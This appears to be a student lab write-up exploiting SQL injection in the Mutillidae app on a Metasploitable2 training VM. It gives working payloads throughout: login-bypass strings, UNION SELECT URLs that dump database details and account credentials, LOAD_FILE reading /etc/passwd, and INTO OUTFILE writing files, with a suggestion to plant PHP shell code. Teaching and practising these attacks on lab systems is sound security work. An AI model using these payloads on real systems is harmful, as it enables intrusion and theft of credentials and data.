# SQL INJECTION
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![280079257-6822e8d4-23f1-42ca-b095-81abcd4df368](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/808210a1-561b-4aa6-aa3e-3e4a10663919)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 

![280079307-829c73a1-91f2-415e-bcb0-46baeb47d5e7](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/4ade51cd-70a3-4b23-a47b-b9c087a42ba0)

 Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![280079399-be07a35d-f2a7-4f82-89ad-6b05e76a0adf](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/f559da0d-2147-49fd-aaf7-5762603ca950)

Click on the menu Login/Register and register for an account

![280079517-51508e3e-d84b-409e-8ab2-c61068a9c8e2](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/179eafa9-d6c2-44c6-8147-3f96fe92eadc)


Click on the link “Please register here” 
![280079591-aeb8235d-3dfa-4d9e-b742-941b16501ebf](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/40a5f834-f8dc-4a70-a324-5fe6640f33e0)

Click on “Create Account” to display the following page: 
![280079644-74d1e3fb-6bd2-4dcc-bf1c-43c816fd00e2](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/f5da577e-fa5e-496f-a91d-2e65bfc97739)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![280079708-f77f270d-0b56-4eeb-b454-c95b5feab62e](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/12bba7b7-d174-4409-b94b-787a9c8a0386)

Click “Login”. The logged in page will show as below: Screenshot 2023-06-10 223535

## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![280079804-abd20fbb-27e8-4045-bcdc-aa95b38fa353](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/cb9aca60-8cce-41ac-aac5-b404bc8f6d2c)

Click the login button and you will see it enter into the administrator page. 

![280079843-75c6f9a9-b281-470a-9b73-55a4836b2798](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/ad9d4a51-bb66-4b9a-acd0-93efce87cff1)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 
![280077015-915bcdbd-d3f8-4d79-8ceb-a2a3a6590140](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/6bde5646-30eb-4934-81ba-62cc69277656)
![280077059-9addd64f-0bee-4090-93d8-079732a01474](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/b2dc0ace-f99e-497d-b546-1c7d65b6e42b)
![280077113-52a085f9-f0dd-4da5-b305-03b218daa820](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/1f283073-45cd-417f-af4d-252cec9982ed)
![280077152-98cf28b1-18eb-4afa-a95b-413ef0d2bb8a](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/d1ff52a1-3a93-47f2-9cb0-861c8eb4b0ea)
![280077263-9a9c4952-7d90-4049-b9ee-c66459a20a72](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/f4e53d3f-737a-4b71-b6f3-a86ffbb628a7)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 
![280077474-e6505853-3555-4151-9f0e-3fe218a8a4f0](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/d59749a5-a9d1-4638-9aeb-db5777c533f8)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![280077620-1cdaac6d-1c0b-4029-a547-6e29d7445dad](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/fdaad3d0-b9e1-4b0a-bf96-b634c0ce36a7)

After adding the order by 6 into the existing url , the following error statement will be obtained: 

![280077737-25816f81-6a78-4b06-8819-bd2daf30fabd](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/25313a4d-9679-4a9a-9f4b-4224d88f59df)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![280077847-28ad29bf-fe4d-459a-913f-c462a8d929f4](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/a5e7052e-abbd-4846-837b-87823dbdf2ea)

As it is having 5 columns the query worked fine and it provides the correct result

![280078020-5d062bbd-0e97-4d15-b92c-9dc4a2752b7a](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/70c8ee2a-6246-43fe-8331-da53e7ad81d7)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![280078131-538a284f-b69e-4a5a-b75d-9441fb36e0fd](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/b11b7a60-bc0a-4633-8a07-9321edc993db)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

![280078247-fc8e56c1-c491-4781-a8a5-600077ad8b01](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/fdd786cc-2e53-4044-a427-84137904229c)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

Screenshot 2023-06-10 225314 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![280078355-bc0d37cf-b94b-43c7-b18a-b241a4be951c](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/c620da13-2657-497b-9ec7-e825142b4273)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![280078876-a09a8d7e-9aa3-42e2-9cf3-90fe2fe3b0b6](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/7affc103-dcbd-4b5b-ac00-3573df1f5de3)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![280078921-719f9890-332b-4b29-ab3a-1e4905bd530a](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/43eaa220-3d91-4dfc-9333-926b82ddea90)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![280078959-6c7dfae4-7adb-47ba-a97d-f4b5bd6e7ec5](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/c5339997-0d1d-4e8f-9ead-2cf6dd551228)

## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 
![280076613-3f7f345e-5396-474c-8274-7dccdd8ac856](https://github.com/Gopikakarthik/sqlinjection/assets/121235427/a3de17fe-7c1f-49b7-bfc9-1f1eb81503b9)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
